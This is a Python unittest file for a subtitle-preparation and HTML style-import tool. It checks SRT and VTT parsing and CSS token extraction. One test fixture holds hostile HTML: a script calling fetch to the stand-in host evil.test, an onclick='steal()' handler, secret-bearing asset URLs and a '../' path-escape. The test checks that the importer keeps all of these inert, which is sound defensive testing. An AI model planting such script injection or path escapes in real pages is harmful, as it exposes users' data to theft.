from __future__ import annotations

import importlib.util
import json
import sys
import tempfile
import unittest
from pathlib import Path

SKILL = Path(__file__).resolve().parents[1]
SCRIPTS = SKILL / "scripts"
sys.path.insert(0, str(SCRIPTS))

import prepare_input  # noqa: E402
import inspect_reference  # noqa: E402


class PrepareInputTests(unittest.TestCase):
    def test_nonfinite_ranges_rejected_and_requested_gap_kept(self):
        for value in ['nan','inf','-inf']:
            with self.assertRaises(prepare_input.InputError):prepare_input.parse_range_time(value)
        with self.assertRaises(prepare_input.InputError):prepare_input.normalize_input('plain text',range_start=1,range_end=2)
        timed='1\n00:00:01,000 --> 00:00:02,000\nhello\n'
        with self.assertRaises(prepare_input.InputError):prepare_input.normalize_input(timed,range_start=float('nan'))
        result=prepare_input.normalize_input(timed,range_start=1,range_end=3,zero_based=True)
        self.assertEqual(result['duration'],2)
        self.assertEqual(result['cues'][0]['end'],1)

    def test_srt_range_clips_and_preserves_original_provenance(self) -> None:
        source = """1
00:00:10,250 --> 00:00:12,500
第一句 &amp; <i>important</i>

2
00:00:12,000 --> 00:00:14,000
Second sentence
"""
        result = prepare_input.normalize_input(
            source,
            source_path="clip.srt",
            source_format="srt",
            range_start=10.5,
            range_end=13.0,
            zero_based=True,
        )
        self.assertFalse(result["planning_only"])
        self.assertEqual(result["source_offset"], 10.5)
        self.assertEqual(result["duration"], 2.5)
        self.assertEqual(result["cues"][0]["start"], 0.0)
        self.assertEqual(result["cues"][0]["end"], 2.0)
        self.assertEqual(result["cues"][0]["original_start"], 10.25)
        self.assertEqual(result["cues"][0]["original_end"], 12.5)
        self.assertEqual(result["cues"][0]["text"], "第一句 & important")
        self.assertEqual(result["cues"][1]["start"], 1.5)
        self.assertEqual(result["cues"][1]["end"], 2.5)
        self.assertTrue(any("Range selected" in item["message"] for item in result["warnings"]))

    def test_vtt_optional_hours_settings_entities_and_speaker_markup(self) -> None:
        source = """WEBVTT

first-cue
00:01.5 --> 00:03.250 align:start
<v Alice>你好</v> &amp; goodbye

00:04.000 --> 00:05.000
Literal &lt;tag&gt;
"""
        result = prepare_input.normalize_input(source, source_path="clip.vtt", source_format="vtt")
        self.assertEqual(result["cue_count"], 2)
        self.assertEqual(result["cues"][0]["start"], 1.5)
        self.assertEqual(result["cues"][0]["end"], 3.25)
        self.assertEqual(result["cues"][0]["id"], "first-cue")
        self.assertEqual(result["cues"][0]["text"], "你好 & goodbye")
        self.assertEqual(result["cues"][1]["text"], "Literal <tag>")

    def test_overlap_duplicate_and_blank_cues_are_warnings_not_silent_drops(self) -> None:
        source = """1
00:00:00,000 --> 00:00:02,000
Repeat

2
00:00:01,500 --> 00:00:03,000
Repeat

3
00:00:01,500 --> 00:00:03,000
Repeat

4
00:00:04,000 --> 00:00:05,000

"""
        result = prepare_input.normalize_input(source, source_format="srt")
        messages = [item["message"] for item in result["warnings"]]
        self.assertEqual(result["cue_count"], 4)
        self.assertTrue(any("overlaps" in message for message in messages))
        self.assertTrue(any("duplicate text and time range" in message for message in messages))
        self.assertTrue(any("text is blank" in message for message in messages))

    def test_plain_text_is_explicitly_planning_only_without_fake_time(self) -> None:
        result = prepare_input.normalize_input("First paragraph\n\nSecond paragraph", source_format="text")
        self.assertTrue(result["planning_only"])
        self.assertEqual(result["timecode_status"], "missing")
        self.assertIsNone(result["duration"])
        self.assertTrue(all(cue["start"] is None and cue["end"] is None for cue in result["cues"]))
        self.assertTrue(any("planning only" in warning for warning in result["warnings"]))

    def test_invalid_timestamps_and_ranges_fail_clearly(self) -> None:
        with self.assertRaises(prepare_input.InputError):
            prepare_input.normalize_input("1\n00:61:00,000 --> 00:62:00,000\nText", source_format="srt")
        with self.assertRaises(prepare_input.InputError):
            prepare_input.normalize_input("1\n00:00:02,000 --> 00:00:01,000\nText", source_format="srt")
        with self.assertRaises(prepare_input.InputError):
            prepare_input.normalize_input("Text", source_format="text", zero_based=True)

    def test_parent_pipeline_function_accepts_path_and_range(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            source = Path(temporary) / "source.srt"
            source.write_text("1\n00:00:05,000 --> 00:00:07,000\nHello\n", encoding="utf-8")
            result = prepare_input.prepare_input(source, start=5.5, end=6.5)
        self.assertEqual(result["source_offset"], 5.5)
        self.assertEqual(result["cues"][0]["start"], 0.0)
        self.assertEqual(result["cues"][0]["end"], 1.0)
        self.assertEqual(result["cues"][0]["original_start"], 5.0)


class StyleImportTests(unittest.TestCase):
    def test_body_background_and_short_css_colors_remain_reusable(self):
        from audit_project import load_tokens
        with tempfile.TemporaryDirectory() as temporary:
            root=Path(temporary);source=root/'source.html'
            source.write_text('<html><style>:root{--Accent:#f80}body{background-color:#fee;color:#123;--accent:var(--Accent)}</style><body></body></html>')
            created=inspect_reference.import_style(source,root/'style')
            tokens=load_tokens(created/'frame.md')
            self.assertEqual(tokens['bg'],'#fee')
            self.assertEqual(tokens['accent'],'#f80')
            self.assertEqual(tokens['ink'],'#123')

    def test_css_specificity_important_inline_and_override_conflicts(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            source = root / "reference.html"
            source.write_text("""<!doctype html>
<style>
:root { --bg: #111111; --accent: #222222; }
:root { --bg: #333333; }
#theme { --bg: #555555 !important; --accent: #ff9900 !important; --display-font: 'Editorial', serif; }
body { --muted: #777777; --line: #999999; --body-font: Arial, sans-serif; }
body { --line: #aaaaaa !important; }
@media (max-width: 700px) { :root { --bg: #eeeeee; } }
</style>
<html id="theme" style="--bg: #aaaaaa; --ink: #123456">
<body></body></html>""", encoding="utf-8")
            result = inspect_reference.inspect_reference(source)
        self.assertEqual(result["tokens"]["bg"], "#555555")
        self.assertEqual(result["tokens"]["accent"], "#ff9900")
        self.assertEqual(result["tokens"]["ink"], "#123456")
        self.assertEqual(result["tokens"]["line"], "#aaaaaa")
        self.assertEqual(result["tokens"]["display_font"], "'Editorial', serif")
        self.assertEqual(result["tokens"]["mono_font"], inspect_reference.DEFAULT_TOKENS["mono_font"])
        self.assertIn("--bg", result["conflicts"])
        self.assertTrue(result["risks"]["media_queries_not_evaluated"])

    def test_real_repository_reference_import_creates_reusable_safe_outputs(self) -> None:
        source = SKILL / "styles" / "cartesian" / "upstream" / "frame-showcase.html"
        with tempfile.TemporaryDirectory() as temporary:
            destination = Path(temporary) / "cartesian-import"
            created = inspect_reference.import_style(source, destination, name="Reference style")
            frame = (created / "frame.md").read_text(encoding="utf-8")
            preview = (created / "style-preview.html").read_text(encoding="utf-8")
            report = (created / "import-report.md").read_text(encoding="utf-8")
            manifest = json.loads((created / "assets-manifest.json").read_text(encoding="utf-8"))
            token_json = frame.split("```json", 1)[1].split("```", 1)[0]
            tokens = json.loads(token_json)
            self.assertEqual(set(tokens), {"bg", "ink", "accent", "muted", "line", "display_font", "body_font", "mono_font"})
            self.assertEqual(tokens["bg"], "#ede8e0")
            self.assertEqual(tokens["accent"], "#8a8178")
            self.assertIn("rgba", " ".join(tokens.values()).lower()) if any("rgba" in value.lower() for value in tokens.values()) else None
            self.assertIn("Script elements detected", report)
            self.assertIn("query strings removed", report)
            self.assertIn("Content-Security-Policy", preview)
            self.assertEqual(preview.lower().count("<article"), 4)
            self.assertNotIn("<script", preview.lower())
            self.assertIsInstance(manifest, list)
            self.assertTrue(manifest)
            self.assertNotIn("fonts.googleapis.com/css?", json.dumps(manifest))
            with self.assertRaises(inspect_reference.ImportErrorSafe):
                inspect_reference.import_style(source, destination, name="Again")
            self.assertTrue((created / "frame.md").exists())

    def test_untrusted_scripts_remote_assets_and_escape_paths_stay_inert(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            source = root / "bad.html"
            source.write_text("""<html><head>
<link rel="stylesheet" href="https://example.test/theme.css?token=secret123">
<style>:root { --bg: #fefefe; --ink: #111111; --accent: #ff6600; --line: #cccccc; }
@import url('https://cdn.test/theme.css?key=private');
</style></head><body onclick="steal()"><script>fetch('https://evil.test')</script>
<img src="../outside.png"><img src="https://cdn.test/image.png?password=do-not-copy">
</body></html>""", encoding="utf-8")
            output = root / "out" / "new-style"
            created = inspect_reference.import_style(source, output)
            preview = (created / "style-preview.html").read_text(encoding="utf-8")
            report = (created / "import-report.md").read_text(encoding="utf-8")
            manifest_text = (created / "assets-manifest.json").read_text(encoding="utf-8")
            risks = inspect_reference.inspect_reference(source)["risks"]
        self.assertFalse(risks["scripts_executed"])
        self.assertEqual(risks["scripts_detected"], 1)
        self.assertGreaterEqual(risks["event_handlers_detected"], 1)
        self.assertTrue(any("outside_source_directory" in item or "outside.png" in item for item in risks["blocked_path_references"]))
        self.assertNotIn("secret123", manifest_text)
        self.assertNotIn("private", manifest_text)
        self.assertNotIn("do-not-copy", manifest_text)
        self.assertNotIn("fetch(", preview)
        self.assertIn("execution: **disabled**", report)
        self.assertIn("outside the source directory were blocked", report)


if __name__ == "__main__":
    unittest.main()
